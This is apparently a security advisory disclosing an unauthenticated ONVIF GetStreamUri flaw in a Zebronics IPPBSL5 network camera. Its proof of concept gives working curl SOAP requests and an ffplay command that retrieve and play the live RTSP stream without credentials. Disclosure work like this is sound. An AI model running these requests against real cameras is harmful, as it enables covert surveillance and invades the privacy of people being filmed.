
## Summary

A security vulnerability was identified in an Zebronics IPPBSL5 Network camera where the **ONVIF Media Service `GetStreamUri` endpoint** responds **without authentication**, exposing a valid **RTSP streaming URL**.
This allows unauthorized access to the live video stream without requiring any credentials.

---

## Vulnerability Overview

* **Vulnerability Type:** Authentication Bypass / Information Disclosure
* **Affected Component:** ONVIF Media Service – `GetStreamUri`
* **Protocol:** SOAP over HTTP + RTSP
* **Access Required:** None
* **User Interaction:** None

---

## Affected Device

* **Device Type:** Zebronics IPPBSL5 Network Camera 
* **Firmware:** *V4.3.FAS0127.L34*
* **ONVIF Status:** Enabled by default
* **RTSP:** Enabled

> The issue was observed on the tested device and may affect other devices using similar firmware or ONVIF implementations.

---

## Vulnerability Details

The camera accepts an unauthenticated ONVIF `GetStreamUri` request and returns a valid RTSP URL.
This behavior violates the **ONVIF** security requirements, which mandate authentication for media access operations.

Because the RTSP URL is returned without access control, any network user can directly stream live video.

---

## Impact

An unauthenticated attacker can:

* Retrieve the RTSP stream URL
* Access live video feeds without credentials
* Monitor the camera in real time
* Compromise privacy of the monitored area


---

## Proof of Concept (PoC)

### Step 1 — Send ONVIF `GetProfiles` (No Authentication)

```bash
curl -X POST http://[CAMERA_IP]/onvif/device_service \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body xmlns:trt="http://www.onvif.org/ver10/media/wsdl">
    <trt:GetProfiles/>
  </s:Body>
</s:Envelope>'
```

---

### Step 2 — Send ONVIF `GetStreamUri` (No Authentication)

```bash
curl -X POST http://[CAMERA_IP]/onvif/Media \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body xmlns:trt="http://www.onvif.org/ver10/media/wsdl">
    <trt:GetStreamUri>
      <trt:StreamSetup>
        <tt:Stream xmlns:tt="http://www.onvif.org/ver10/schema">RTP-Unicast</tt:Stream>
        <tt:Transport xmlns:tt="http://www.onvif.org/ver10/schema">
          <tt:Protocol>RTSP</tt:Protocol>
        </tt:Transport>
      </trt:StreamSetup>
      <trt:ProfileToken>000</trt:ProfileToken>
    </trt:GetStreamUri>
  </s:Body>
</s:Envelope>'
```

**Response contains a valid RTSP URL**, even though no authentication was provided.

---

### Step 3 — Access Live Stream

```bash
ffplay rtsp://[CAMERA_IP]:554/...
```

Live video stream plays without username or password.

---

## Root Cause

The device fails to enforce authentication and authorization checks on the ONVIF Media Service `GetStreamUri` operation.


